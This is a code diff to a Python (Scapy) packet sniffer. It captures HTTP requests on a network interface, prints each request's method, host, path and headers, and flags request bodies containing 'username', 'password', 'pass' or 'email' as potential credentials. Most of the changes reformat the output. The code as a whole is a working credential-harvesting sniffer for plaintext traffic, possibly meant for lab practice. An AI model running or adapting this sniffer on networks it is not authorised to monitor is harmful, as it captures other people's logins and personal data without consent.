@@ -21,24 +21,29 @@ def sniff_packets(iface):
 def process_packet(packet):
     try:
         if packet.haslayer(HTTPRequest):
-            method = packet[HTTPRequest].Method.decode('utf-8', errors='ignore') if isinstance(packet[HTTPRequest].Method, bytes) else packet[HTTPRequest].Method
-            host = packet[HTTPRequest].Host.decode('utf-8', errors='ignore') if isinstance(packet[HTTPRequest].Host, bytes) else packet[HTTPRequest].Host
-            path = packet[HTTPRequest].Path.decode('utf-8', errors='ignore') if isinstance(packet[HTTPRequest].Path, bytes) else packet[HTTPRequest].Path
+            method = packet[HTTPRequest].Method if isinstance(packet[HTTPRequest].Method, bytes) else str(packet[HTTPRequest].Method)
+            host = packet[HTTPRequest].Host if isinstance(packet[HTTPRequest].Host, bytes) else str(packet[HTTPRequest].Host)
+            path = packet[HTTPRequest].Path if isinstance(packet[HTTPRequest].Path, bytes) else str(packet[HTTPRequest].Path)
             headers = packet[HTTPRequest].fields  # Get all HTTP headers
-            header_info = "; ".join([f"{k}: {v}" for k, v in headers.items() if isinstance(v, bytes)])
+            header_info = "\n".join([f"{k.decode('utf-8', errors='ignore')}: {v.decode('utf-8', errors='ignore')}" if isinstance(v, bytes) else f"{k}: {v}" for k, v in headers.items()])
 
-            print(f"[+] {method} Request >> {host}{path}")
-            print(f"Headers: {header_info}")
+            print(f"\n[+] HTTP Request:")
+            print(f"    - Method: {method}")
+            print(f"    - Host: {host}")
+            print(f"    - Path: {path}")
+            print(f"    - Headers:\n{header_info}")
 
             if packet.haslayer(Raw):
-                load = packet[Raw].load.decode('utf-8', errors='ignore') if isinstance(packet[Raw].load, bytes) else packet[Raw].load
+                load = packet[Raw].load.decode('utf-8', errors='ignore') if isinstance(packet[Raw].load, bytes) else str(packet[Raw].load)
                 keys = ["username", "password", "pass", "email"]
                 for key in keys:
                     if key in load:
-                        print(f"\n\n\n[+] Possible password/username >> {load}\n\n\n")
+                        print(f"\n[+] Potential credentials found in payload:")
+                        print(f"    {load.strip()}\n")
                         break
     except Exception as e:
         logging.error(f"Error processing packet: {str(e)}")
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
@@ -47,3 +52,4 @@ if __name__ == "__main__":
         logging.error("Please specify an interface using '-i' or '--interface'")
         sys.exit(1)
     sniff_packets(iface)
+
